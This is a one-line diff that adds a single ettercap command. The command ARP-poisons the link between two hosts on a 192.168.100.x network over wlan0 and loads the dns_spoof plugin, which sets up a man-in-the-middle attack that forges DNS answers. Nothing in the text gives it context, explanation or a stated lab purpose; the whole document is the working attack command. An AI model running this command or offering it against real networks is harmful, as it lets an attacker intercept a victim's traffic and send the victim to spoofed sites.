@@ -1,0 +1,1 @@
+ettercap -Tq  -M  arp:remote -i wlan0 -S -P dns_spoof /192.168.100.1// /192.168.100.2//
